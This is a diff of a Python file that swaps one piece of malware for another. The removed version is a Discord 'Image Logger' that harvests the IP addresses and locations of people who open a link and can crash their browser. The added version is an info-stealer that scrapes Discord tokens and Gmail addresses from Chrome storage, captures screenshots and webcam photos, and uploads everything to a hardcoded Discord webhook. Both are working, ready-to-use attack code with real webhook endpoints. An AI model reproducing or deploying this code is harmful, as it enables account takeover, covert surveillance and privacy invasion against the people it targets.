@@ -1,304 +1,374 @@
-# Image Logger
-# By Team C00lB0i/C00lB0i | https://github.com/OverPowerC
+##Besm rab
+import os
+import platform
+import psutil
+import requests
+import socket
+from PIL import ImageGrab
+import time
+import re
 
-from http.server import BaseHTTPRequestHandler
-from urllib import parse
-import traceback, requests, base64, httpagentparser
 
-__app__ = "Discord Image Logger"
-__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
-__version__ = "v2.0"
-__author__ = "C00lB0i"
+try:
+    import cv2
+    CAMERA_AVAILABLE = True
+except ImportError:
+    CAMERA_AVAILABLE = False
+    print("Warning: OpenCV not available. Camera functionality will not work.")
 
-config = {
-    # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1406143391984517193/0Tw7v7S61tX9iWVjnwvEMZqGdBhNE_eDMcKU3Jl2GdsCpEdjYui27ClouNstQoE24CFW",
-    "image": "https://media3.giphy.com/media/v1.Y2lkPTc5MGI3NjExenJ5a29kdjQxNXF2MWxzb2pyYTJzNXBraWVoMHNwdnpoN3B4MHJ0OSZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/3o6UAXY88zkVb4GTug/giphy.gif", # You can also have a custom image by using a URL argument
-                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
-    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
-    # CUSTOMIZATION #
-    "username": "Image Logger", # Set this to the name you want the webhook to have
-    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)
+WEBHOOK_URL = "https://discord.com/api/webhooks/1405573227807375451/WMz4xR8ZmPng_Y9hqzP63ToPSY6MTYuVGRirHcsBorEeY4-AKG59-r52ZeiwMD6hg30p"
 
-    # OPTIONS #
-    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/OverPowerC/Chromebook-Crasher)
-    
-    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.
-
-    "message": { # Show a custom message when the user opens the image
-        "doMessage": False, # Enable the custom message?
-        "message": "This browser has been pwned by C00lB0i's Image Logger. https://github.com/OverPowerC", # Message to show
-        "richMessage": True, # Enable rich text? (See README for more info)
-    },
-
-    "vpnCheck": 1, # Prevents VPNs from triggering the alert
-                # 0 = No Anti-VPN
-                # 1 = Don't ping when a VPN is suspected
-                # 2 = Don't send an alert when a VPN is suspected
-
-    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
-    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)
-
-    "antiBot": 1, # Prevents bots from triggering the alert
-                # 0 = No Anti-Bot
-                # 1 = Don't ping when it's possibly a bot
-                # 2 = Don't ping when it's 100% a bot
-                # 3 = Don't send an alert when it's possibly a bot
-                # 4 = Don't send an alert when it's 100% a bot
-    
-
-    # REDIRECTION #
-    "redirect": {
-        "redirect": False, # Redirect to a webpage?
-        "page": "https://your-link.here" # Link to the webpage to redirect to 
-    },
-
-    # Please enter all values in correct format. Otherwise, it may break.
-    # Do not edit anything below this, unless you know what you're doing.
-    # NOTE: Hierarchy tree goes as follows:
-    # 1) Redirect (If this is enabled, disables image and crash browser)
-    # 2) Crash Browser (If this is enabled, disables image)
-    # 3) Message (If this is enabled, disables image)
-    # 4) Image 
-}
-
-blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
-                                                           # This feature is undocumented mainly due to it being for detecting bots better.
-
-def botCheck(ip, useragent):
-    if ip.startswith(("34", "35")):
-        return "Discord"
-    elif useragent.startswith("TelegramBot"):
-        return "Telegram"
-    else:
-        return False
-
-def reportError(error):
-    requests.post(config["webhook"], json = {
-    "username": config["username"],
-    "content": "@everyone",
-    "embeds": [
-        {
-            "title": "Image Logger - Error",
-            "color": config["color"],
-            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
-        }
-    ],
-})
-
-def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
-    if ip.startswith(blacklistedIPs):
-        return
-    
-    bot = botCheck(ip, useragent)
-    
-    if bot:
-        requests.post(config["webhook"], json = {
-    "username": config["username"],
-    "content": "",
-    "embeds": [
-        {
-            "title": "Image Logger - Link Sent",
-            "color": config["color"],
-            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
-        }
-    ],
-}) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
-        return
-
-    ping = "@everyone"
-
-    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
-    if info["proxy"]:
-        if config["vpnCheck"] == 2:
-                return
+def get_system_info():
+    """Gathers system and drive information."""
+    try:
+        # --- System ---
+        system_info = f"**System Information for {socket.gethostname()}**\n"
+        system_info += "```\n"
+        system_info += f"OS: {platform.system()} {platform.release()} ({platform.version()})\n"
+        system_info += f"Processor: {platform.processor()}\n"
+        system_info += f"Machine: {platform.machine()}\n"
+        system_info += f"Architecture: {' '.join(platform.architecture())}\n"
         
-        if config["vpnCheck"] == 1:
-            ping = ""
-    
-    if info["hosting"]:
-        if config["antiBot"] == 4:
-            if info["proxy"]:
-                pass
-            else:
-                return
-
-        if config["antiBot"] == 3:
-                return
-
-        if config["antiBot"] == 2:
-            if info["proxy"]:
-                pass
-            else:
-                ping = ""
-
-        if config["antiBot"] == 1:
-                ping = ""
-
-
-    os, browser = httpagentparser.simple_detect(useragent)
-    
-    embed = {
-    "username": config["username"],
-    "content": ping,
-    "embeds": [
-        {
-            "title": "Image Logger - IP Logged",
-            "color": config["color"],
-            "description": f"""**A User Opened the Original Image!**
-
-**Endpoint:** `{endpoint}`
-            
-**IP Info:**
-> **IP:** `{ip if ip else 'Unknown'}`
-> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
-> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
-> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
-> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
-> **City:** `{info['city'] if info['city'] else 'Unknown'}`
-> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
-> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
-> **Mobile:** `{info['mobile']}`
-> **VPN:** `{info['proxy']}`
-> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`
-
-**PC Info:**
-> **OS:** `{os}`
-> **Browser:** `{browser}`
-
-**User Agent:**
-```
-{useragent}
-```""",
-    }
-  ],
-}
-    
-    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
-    requests.post(config["webhook"], json = embed)
-    return info
-
-binaries = {
-    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
-    # This IS NOT a rat or virus, it's just a loading image. (Made by me! :D)
-    # If you don't trust it, read the code or don't use this at all. Please don't make an issue claiming it's duahooked or malicious.
-    # You can look at the below snippet, which simply serves those bytes to any client that is suspected to be a Discord crawler.
-}
-
-class ImageLoggerAPI(BaseHTTPRequestHandler):
-    
-    def handleRequest(self):
-        try:
-            if config["imageArgument"]:
-                s = self.path
-                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
-                if dic.get("url") or dic.get("id"):
-                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
-                else:
-                    url = config["image"]
-            else:
-                url = config["image"]
-
-            data = f'''<style>body {{
-margin: 0;
-padding: 0;
-}}
-div.img {{
-background-image: url('{url}');
-background-position: center center;
-background-repeat: no-repeat;
-background-size: contain;
-width: 100vw;
-height: 100vh;
-}}</style><div class="img"></div>'''.encode()
-            
-            if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
-                return
-            
-            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
-                self.send_response(200 if config["buggedImage"] else 302) # 200 = OK (HTTP Status)
-                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url) # Define the data as an image so Discord can show it.
-                self.end_headers() # Declare the headers as finished.
-
-                if config["buggedImage"]: self.wfile.write(binaries["loading"]) # Write the image to the client.
-
-                makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
-                
-                return
-            
-            else:
-                s = self.path
-                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
-
-                if dic.get("g") and config["accurateLocation"]:
-                    location = base64.b64decode(dic.get("g").encode()).decode()
-                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url)
-                else:
-                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
-                
-
-                message = config["message"]["message"]
-
-                if config["message"]["richMessage"] and result:
-                    message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
-                    message = message.replace("{isp}", result["isp"])
-                    message = message.replace("{asn}", result["as"])
-                    message = message.replace("{country}", result["country"])
-                    message = message.replace("{region}", result["regionName"])
-                    message = message.replace("{city}", result["city"])
-                    message = message.replace("{lat}", str(result["lat"]))
-                    message = message.replace("{long}", str(result["lon"]))
-                    message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
-                    message = message.replace("{mobile}", str(result["mobile"]))
-                    message = message.replace("{vpn}", str(result["proxy"]))
-                    message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
-                    message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
-                    message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])
-
-                datatype = 'text/html'
-
-                if config["message"]["doMessage"]:
-                    data = message.encode()
-                
-                if config["crashBrowser"]:
-                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>' # Crasher code by me! https://github.com/OverPower/Chromebook-Crasher
-
-                if config["redirect"]["redirect"]:
-                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
-                self.send_response(200) # 200 = OK (HTTP Status)
-                self.send_header('Content-type', datatype) # Define the data as an image so Discord can show it.
-                self.end_headers() # Declare the headers as finished.
-
-                if config["accurateLocation"]:
-                    data += b"""<script>
-var currenturl = window.location.href;
-
-if (!currenturl.includes("g=")) {
-    if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(function (coords) {
-    if (currenturl.includes("?")) {
-        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
-    } else {
-        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
-    }
-    location.replace(currenturl);});
-}}
-
-</script>"""
-                self.wfile.write(data)
+        # --- Drive ---
+        system_info += "\nDrive Information\n"
+        partitions = psutil.disk_partitions()
+        for partition in partitions:
+            try:
+                usage = psutil.disk_usage(partition.mountpoint)
+                system_info += (
+                    f"  Drive {partition.device} ({partition.fstype})\n"
+                    f"    - Total Size: {usage.total / (1024**3):.2f} GB\n"
+                    f"    - Used: {usage.used / (1024**3):.2f} GB\n"
+                    f"    - Free: {usage.free / (1024**3):.2f} GB\n"
+                    f"    - Usage: {usage.percent}%\n"
+                )
+            except Exception as e:
+                system_info += f"  Could not retrieve info for drive {partition.device}: {e}\n"
         
-        except Exception:
-            self.send_response(500)
-            self.send_header('Content-type', 'text/html')
-            self.end_headers()
+        system_info += "```"
+        return system_info
+    
+    except Exception as e:
+        return f"**An error occurred while gathering system information:** {e}"
 
-            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
-            reportError(traceback.format_exc())
+def take_screenshot():
+    """Take a screenshot and save it to a temporary file."""
+    try:
+        screenshot_path = os.path.join(os.getenv('TEMP'), 'screenshot.png')
+        screenshot = ImageGrab.grab()
+        screenshot.save(screenshot_path, 'PNG')
+        return screenshot_path
+    except Exception as e:
+        print(f"An error occurred while taking screenshot: {e}")
+        return None
 
+def take_camera_photo():
+    """Capture a photo using the system's camera."""
+    
+    if not CAMERA_AVAILABLE:
+        print("Camera functionality not available (OpenCV not installed).")
+        return None
+    
+    try:
+        
+        cap = cv2.VideoCapture(0)
+        
+        
+        if not cap.isOpened():
+            print("Error: Could not open camera.")
+            return None
+        
+        
+        time.sleep(2)
+        
+        
+        ret, frame = cap.read()
+        
+        cap.release()
+        
+        if ret:
+            
+            photo_path = os.path.join(os.getenv('TEMP'), 'camera_photo.png')
+            cv2.imwrite(photo_path, frame)
+            return photo_path
+        else:
+            print("Error: Could not capture frame.")
+            return None
+    except Exception as e:
+        print(f"An error occurred while taking camera photo: {e}")
+        return None
+
+def find_chrome_gmail_addresses():
+    """Find Gmail addresses saved in Google Chrome."""
+    gmail_addresses = set()
+    
+    try:
+        
+        chrome_path = os.path.join(os.getenv('LOCALAPPDATA'), 'Google', 'Chrome', 'User Data', 'Default')
+        
+        if not os.path.exists(chrome_path):
+            chrome_path = os.path.join(os.path.expanduser("~"), "AppData", "Local", "Google", "Chrome", "User Data", "Default")
+        
+        
+        chrome_files = [
+            os.path.join(chrome_path, 'Preferences'),
+            os.path.join(chrome_path, 'Secure Preferences'),
+            os.path.join(chrome_path, 'Login Data'),
+            os.path.join(chrome_path, 'Web Data')
+        ]
+        
+        
+        gmail_pattern = re.compile(r'([a-zA-Z0-9._%+-]+@gmail\.com)')
+        
+        for file_path in chrome_files:
+            if os.path.exists(file_path):
+                try:
+                    
+                    if file_path.endswith(('Login Data', 'Web Data')):
+                        import sqlite3
+                        import tempfile
+                        import shutil
+                        
+                        
+                        temp_dir = tempfile.mkdtemp()
+                        temp_db_path = os.path.join(temp_dir, os.path.basename(file_path))
+                        shutil.copy2(file_path, temp_db_path)
+                        
+                        
+                        conn = sqlite3.connect(temp_db_path)
+                        cursor = conn.cursor()
+                        
+                        
+                        try:
+                            
+                            cursor.execute("SELECT name FROM sqlite_master WHERE type='table';")
+                            tables = cursor.fetchall()
+                            
+                            for table in tables:
+                                table_name = table[0]
+                                try:
+                                    
+                                    cursor.execute(f"PRAGMA table_info({table_name});")
+                                    columns = cursor.fetchall()
+                                    column_names = [col[1] for col in columns]
+                                    
+                                    
+                                    for column_name in column_names:
+                                        if 'email' in column_name.lower() or 'user' in column_name.lower() or 'name' in column_name.lower():
+                                            try:
+                                                cursor.execute(f"SELECT {column_name} FROM {table_name};")
+                                                rows = cursor.fetchall()
+                                                for row in rows:
+                                                    if row[0]:
+                                                        matches = gmail_pattern.findall(str(row[0]))
+                                                        gmail_addresses.update(matches)
+                                            except:
+                                                pass
+                                except:
+                                    pass
+                        except:
+                            pass
+                        
+                        conn.close()
+                        
+                        shutil.rmtree(temp_dir)
+                    else:
+                        
+                        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
+                            content = f.read()
+                            matches = gmail_pattern.findall(content)
+                            gmail_addresses.update(matches)
+                except Exception as e:
+                    
+                    pass
+        
+        
+        if gmail_addresses:
+            gmail_info = "\nGmail Addresses Found in Chrome\n```\n"
+            for address in gmail_addresses:
+                gmail_info += f"{address}\n"
+            gmail_info += "```"
+            return gmail_info
+        else:
+            return "\nNo Gmail addresses found in Chrome.\n"
+    
+    except Exception as e:
+        return f"\n**An error occurred while searching for Chrome Gmail addresses:** {e}\n"
+
+def find_discord_tokens():
+    """Find Discord tokens in Google Chrome's storage."""
+    tokens = set()
+    
+    try:
+        
+        chrome_path = os.path.join(os.getenv('LOCALAPPDATA'), 'Google', 'Chrome', 'User Data')
+        
+        if not os.path.exists(chrome_path):
+            
+            chrome_path = os.path.join(os.path.expanduser("~"), "AppData", "Local", "Google", "Chrome", "User Data")
+        
+        
+        if not os.path.exists(chrome_path):
+            return "\nChrome data directory not found.\n"
+        
+        
+        token_pattern = re.compile(r'([a-zA-Z0-9_-]{24,30}\.[a-zA-Z0-9_-]{6,7}\.[a-zA-Z0-9_-]{27,38})')
+        
+        
+        for root, dirs, files in os.walk(chrome_path):
+            
+            dirs[:] = [d for d in dirs if not d.startswith('.') and not d.startswith('System') and not d.startswith('Snapshot')]
+            
+            
+            if os.path.basename(root) in ['Default', 'Profile 1', 'Profile 2', 'Profile 3', 'Profile 4', 'Profile 5'] or root.endswith('Default') or 'Profile' in root:
+                
+                local_storage_path = os.path.join(root, 'Local Storage', 'leveldb')
+                if os.path.exists(local_storage_path):
+                    for file_name in os.listdir(local_storage_path):
+                        if file_name.endswith('.log') or file_name.endswith('.ldb'):
+                            file_path = os.path.join(local_storage_path, file_name)
+                            try:
+                                with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
+                                    content = f.read()
+                                    matches = token_pattern.findall(content)
+                                    tokens.update(matches)
+                            except Exception as e:
+                                
+                                pass
+                
+                
+                indexeddb_path = os.path.join(root, 'IndexedDB')
+                if os.path.exists(indexeddb_path):
+                    for db_dir in os.listdir(indexeddb_path):
+                        if db_dir.startswith('https_discord.com_'):
+                            db_path = os.path.join(indexeddb_path, db_dir)
+                            if os.path.isdir(db_path):
+                                for file_name in os.listdir(db_path):
+                                    if file_name.endswith('.log') or file_name.endswith('.ldb'):
+                                        file_path = os.path.join(db_path, file_name)
+                                        try:
+                                            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
+                                                content = f.read()
+                                                matches = token_pattern.findall(content)
+                                                tokens.update(matches)
+                                        except Exception as e:
+                                            
+                                            pass
+                
+                
+                session_storage_path = os.path.join(root, 'Session Storage')
+                if os.path.exists(session_storage_path):
+                    for file_name in os.listdir(session_storage_path):
+                        if file_name.endswith('.log') or file_name.endswith('.ldb'):
+                            file_path = os.path.join(session_storage_path, file_name)
+                            try:
+                                with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
+                                    content = f.read()
+                                    matches = token_pattern.findall(content)
+                                    tokens.update(matches)
+                            except Exception as e:
+                                
+                                pass
+        
+        
+        if tokens:
+            token_info = "\nDiscord Tokens Found in Chrome\n```\n"
+            for token in tokens:
+                token_info += f"{token}\n"
+            token_info += "```"
+            return token_info
+        else:
+            return "\nNo Discord tokens found in Chrome.\n"
+    
+    except Exception as e:
+        return f"\n**An error occurred while searching for Discord tokens:** {e}\n"
+
+def send_to_discord(webhook_url, message, file_paths=None):
+    """Send message and optional files to Discord webhook."""
+    if not message:
+        print("Message is empty, not sending.")
         return
     
-    do_GET = handleRequest
-    do_POST = handleRequest
+    try:
+        if file_paths and isinstance(file_paths, list):
+            
+            data = {"content": message}
+            
+            files = []
+            for file_path in file_paths:
+                if os.path.exists(file_path):
+                    files.append(('file', (os.path.basename(file_path), open(file_path, 'rb'))))
+            
+            if files:
+                response = requests.post(webhook_url, data=data, files=files)
+                
+                for _, (_, f) in files:
+                    f.close()
+            else:
+                response = requests.post(webhook_url, data=data)
+        elif file_paths and os.path.exists(file_paths):
+            with open(file_paths, 'rb') as f:
+                files = {'file': (os.path.basename(file_paths), f)}
+                data = {"content": message}
+                response = requests.post(webhook_url, data=data, files=files)
+        else:
+        
+            data = {"content": message}
+            response = requests.post(webhook_url, data=data)
+        
+        response.raise_for_status()
+        print("Successfully sent information to Discord.")
+    except requests.exceptions.RequestException as e:
+        print(f"Failed to send information to Discord: {e}")
 
-handler = app = ImageLoggerAPI
+def main():
+    """Main function to collect all information and send to Discord."""
+    print("Collecting system information...")
+    
+    
+    system_info = get_system_info()
+    
+    
+    print("Searching for Gmail addresses in Chrome...")
+    gmail_info = find_chrome_gmail_addresses()
+    
+    
+    print("Searching for Discord tokens in Chrome...")
+    discord_info = find_discord_tokens()
+    
+    
+    full_info = system_info + gmail_info + discord_info
+    
+    
+    print("Taking screenshot...")
+    screenshot_path = take_screenshot()
+    
+   
+    print("Taking camera photo...")
+    photo_path = take_camera_photo()
+    
+    
+    print("Sending information to Discord...")
+    
+    file_paths = []
+    if screenshot_path and os.path.exists(screenshot_path):
+        file_paths.append(screenshot_path)
+    if photo_path and os.path.exists(photo_path):
+        file_paths.append(photo_path)
+    
+    send_to_discord(WEBHOOK_URL, full_info, file_paths)
+    
+    
+    try:
+        if screenshot_path and os.path.exists(screenshot_path):
+            os.remove(screenshot_path)
+        if photo_path and os.path.exists(photo_path):
+            os.remove(photo_path)
+    except Exception as e:
+        print(f"Error cleaning up files: {e}")
+
+if __name__ == "__main__":
+    main()
+
+##Bedrood -- haj c0mrade
